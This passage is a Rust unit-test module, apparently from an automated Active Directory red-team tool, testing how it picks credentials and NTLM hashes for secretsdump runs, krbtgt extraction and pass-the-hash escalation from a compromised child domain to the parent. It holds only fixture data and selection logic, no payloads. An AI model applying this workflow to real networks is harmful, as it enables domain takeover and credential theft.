        // Even with a NOT_UNIQUE warning in the text, a parsed krbtgt wins.
        let class = classify_krbtgt_result(
            Some(&discoveries),
            "ERROR_DS_NAME_ERROR_NOT_UNIQUE",
            "contoso.local",
        );
        assert_eq!(class, DumpClass::Success);
    }

    #[test]
    fn classify_krbtgt_result_name_not_unique_before_rejection() {
        // NOT_UNIQUE is a retry signal and must not be read as a broken
        // principal even if some rejection-ish token also appears.
        let class = classify_krbtgt_result(None, "ERROR_DS_NAME_ERROR_NOT_UNIQUE", "contoso.local");
        assert_eq!(class, DumpClass::NameNotUnique);
    }

    #[test]
    fn classify_krbtgt_result_logon_failure_is_rejected() {
        let class = classify_krbtgt_result(None, "STATUS_LOGON_FAILURE", "contoso.local");
        assert_eq!(class, DumpClass::AuthRejected);
    }

    #[test]
    fn classify_krbtgt_result_access_denied_is_rejected() {
        let class = classify_krbtgt_result(None, "RPC_S_ACCESS_DENIED", "contoso.local");
        assert_eq!(class, DumpClass::AuthRejected);
    }

    #[test]
    fn classify_krbtgt_result_unknown_is_transient() {
        let class = classify_krbtgt_result(None, "Connection reset by peer", "contoso.local");
        assert_eq!(class, DumpClass::Transient);
    }

    #[test]
    fn krbtgt_principal_attempt_key_scopes_by_principal() {
        assert_eq!(
            krbtgt_principal_attempt_key("192.168.58.20", "CONTOSO.LOCAL", "Alice"),
            "192.168.58.20:contoso.local:krbtgt_extract_principal:alice"
        );
    }

    #[test]
    fn is_logon_failure_detects_status_logon_failure() {
        let output = "Impacket v0.13.0.dev0 - Copyright Fortra, LLC\n\n\
            [-] RemoteOperations failed: SMB SessionError: code: 0xc000006d - \
            STATUS_LOGON_FAILURE - The attempted logon is invalid.\n[*] Cleaning up...\n";
        assert!(is_logon_failure(output));
    }

    #[test]
    fn is_logon_failure_detects_kerberos_preauth() {
        assert!(is_logon_failure("KDC_ERR_PREAUTH_FAILED"));
    }

    #[test]
    fn is_logon_failure_ignores_generic_failure_text() {
        assert!(!is_logon_failure(
            "[-] RemoteOperations failed: Connection reset by peer"
        ));
    }

    #[test]
    fn is_logon_failure_ignores_empty_output() {
        assert!(!is_logon_failure(""));
    }

    #[test]
    fn select_krbtgt_candidates_prefers_hash_then_password() {
        let mut s = StateInner::new("op".into());
        s.hashes
            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
        let mut alice = make_cred("alice", "Pw", "contoso.local");
        alice.is_admin = true;
        s.credentials.push(alice);
        let candidates = select_krbtgt_candidates(&s, "contoso.local");
        assert_eq!(candidates.len(), 2);
        assert_eq!(candidates[0].0, "Administrator");
        assert!(matches!(candidates[0].1, KrbtgtAuth::Hash(ref h) if h == "deadbeef"));
        assert_eq!(candidates[1].0, "alice");
        assert!(matches!(candidates[1].1, KrbtgtAuth::Password(ref p) if p == "Pw"));
    }

    #[test]
    fn select_krbtgt_candidates_dedups_hash_and_password_for_same_user() {
        let mut s = StateInner::new("op".into());
        let mut h = make_admin_ntlm_hash("contoso.local", "deadbeef");
        h.username = "alice".into();
        s.hashes.push(h);
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        let candidates = select_krbtgt_candidates(&s, "contoso.local");
        assert_eq!(candidates.len(), 1);
        assert_eq!(candidates[0].0, "alice");
        assert!(matches!(candidates[0].1, KrbtgtAuth::Hash(_)));
    }

    #[test]
    fn select_krbtgt_candidates_skips_quarantined_and_delegation() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.quarantine_principal("alice", "contoso.local");
        assert!(select_krbtgt_candidates(&s, "contoso.local").is_empty());
    }

    #[test]
    fn select_krbtgt_candidates_skips_wrong_domain() {
        let mut s = StateInner::new("op".into());
        s.hashes
            .push(make_admin_ntlm_hash("fabrikam.local", "deadbeef"));
        s.credentials
            .push(make_cred("alice", "Pw", "fabrikam.local"));
        assert!(select_krbtgt_candidates(&s, "contoso.local").is_empty());
    }

    #[test]
    fn select_krbtgt_candidates_skips_empty_password() {
        let mut s = StateInner::new("op".into());
        s.credentials.push(make_cred("alice", "", "contoso.local"));
        assert!(select_krbtgt_candidates(&s, "contoso.local").is_empty());
    }

    #[test]
    fn discoveries_include_krbtgt_accepts_matching_ntlm_hash() {
        let discoveries = json!({
            "hashes": [{
                "username": "krbtgt",
                "domain": "contoso.local",
                "hash_type": "ntlm",
                "hash_value": "lm:nt"
            }]
        });
        assert!(discoveries_include_krbtgt(
            Some(&discoveries),
            "CONTOSO.LOCAL"
        ));
    }

    #[test]
    fn discoveries_include_krbtgt_rejects_wrong_domain() {
        let discoveries = json!({
            "hashes": [{
                "username": "krbtgt",
                "domain": "fabrikam.local",
                "hash_type": "ntlm",
                "hash_value": "lm:nt"
            }]
        });
        assert!(!discoveries_include_krbtgt(
            Some(&discoveries),
            "contoso.local"
        ));
    }

    // tests for select_local_admin_secretsdump_work / select_pth_secretsdump_work

    fn make_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: format!("c-{user}-{domain}"),
            username: user.to_string(),
            password: password.to_string(),
            domain: domain.to_string(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_admin_ntlm_hash(domain: &str, value: &str) -> ares_core::models::Hash {
        ares_core::models::Hash {
            id: format!("h-admin-{domain}"),
            username: "Administrator".into(),
            hash_value: value.into(),
            hash_type: "NTLM".into(),
            domain: domain.into(),
            cracked_password: None,
            source: String::new(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        }
    }

    #[test]
    fn select_local_admin_skips_empty_password() {
        let mut s = StateInner::new("op".into());
        s.credentials.push(make_cred("alice", "", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_local_admin_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_local_admin_skips_empty_domain() {
        let mut s = StateInner::new("op".into());
        s.credentials.push(make_cred("alice", "Pw", ""));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_local_admin_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_local_admin_pairs_cred_with_same_domain_dc() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_local_admin_secretsdump_work(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].1, "192.168.58.10");
        assert_eq!(work[0].2.username, "alice");
    }

    #[test]
    fn select_local_admin_pairs_parent_cred_with_child_dc() {
        // Parent-domain credentials are valid against child DCs
        // (`is_valid_secretsdump_target` rules child as same-forest).
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.domain_controllers
            .insert("child.contoso.local".into(), "192.168.58.11".into());
        let work = select_local_admin_secretsdump_work(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].1, "192.168.58.11");
    }

    #[test]
    fn select_local_admin_skips_cross_forest_dc() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        assert!(select_local_admin_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_local_admin_skips_quarantined_principal() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.quarantine_principal("alice", "contoso.local");
        assert!(select_local_admin_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_local_admin_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(
            DEDUP_SECRETSDUMP,
            secretsdump_dedup_key("192.168.58.10", "contoso.local", "alice"),
        );
        assert!(select_local_admin_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_local_admin_emits_one_item_per_cred_dc_pair() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw1", "contoso.local"));
        s.credentials.push(make_cred("bob", "Pw2", "contoso.local"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.domain_controllers
            .insert("child.contoso.local".into(), "192.168.58.11".into());
        let work = select_local_admin_secretsdump_work(&s);
        // 2 creds × 2 DCs = 4 items.
        assert_eq!(work.len(), 4);
    }

    #[test]
    fn select_pth_returns_empty_when_no_dominated_child() {
        let mut s = StateInner::new("op".into());
        s.hashes
            .push(make_admin_ntlm_hash("child.contoso.local", "deadbeef"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        // No dominated_domains entry → no PTH work.
        assert!(select_pth_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_pth_emits_when_child_dominated_and_admin_hash_present() {
        let mut s = StateInner::new("op".into());
        s.dominated_domains.insert("child.contoso.local".into());
        s.hashes
            .push(make_admin_ntlm_hash("child.contoso.local", "deadbeef"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_pth_secretsdump_work(&s);
        assert_eq!(work.len(), 1);
        // (dedup_key, parent_dc_ip, child_domain, ntlm_hash, parent_domain_lc)
        assert_eq!(work[0].1, "192.168.58.10");
        assert_eq!(work[0].2, "child.contoso.local");
        assert_eq!(work[0].3, "deadbeef");
        assert_eq!(work[0].4, "contoso.local");
    }

    #[test]
    fn select_pth_skips_when_no_matching_admin_hash() {
        let mut s = StateInner::new("op".into());
        s.dominated_domains.insert("child.contoso.local".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        // No admin hash for child.contoso.local → skip.
        assert!(select_pth_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_pth_skips_non_ntlm_hash() {
        let mut s = StateInner::new("op".into());
        s.dominated_domains.insert("child.contoso.local".into());
        let mut h = make_admin_ntlm_hash("child.contoso.local", "deadbeef");
        h.hash_type = "AES256".into();
        s.hashes.push(h);
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_pth_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_pth_skips_non_administrator_username() {
        let mut s = StateInner::new("op".into());
        s.dominated_domains.insert("child.contoso.local".into());
        let mut h = make_admin_ntlm_hash("child.contoso.local", "deadbeef");
        h.username = "alice".into();
        s.hashes.push(h);
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_pth_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_pth_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        s.dominated_domains.insert("child.contoso.local".into());
        s.hashes
            .push(make_admin_ntlm_hash("child.contoso.local", "deadbeef"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(
            DEDUP_SECRETSDUMP,
            pth_secretsdump_dedup_key("192.168.58.10", "contoso.local"),
        );
        assert!(select_pth_secretsdump_work(&s).is_empty());
    }

    #[test]
    fn select_pth_skips_when_dc_is_not_parent_of_dominated_child() {
        // dominated = grandchild; DC list has unrelated forest → no work.
        let mut s = StateInner::new("op".into());
        s.dominated_domains.insert("child.contoso.local".into());
        s.hashes
            .push(make_admin_ntlm_hash("child.contoso.local", "deadbeef"));
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        assert!(select_pth_secretsdump_work(&s).is_empty());
    }
}
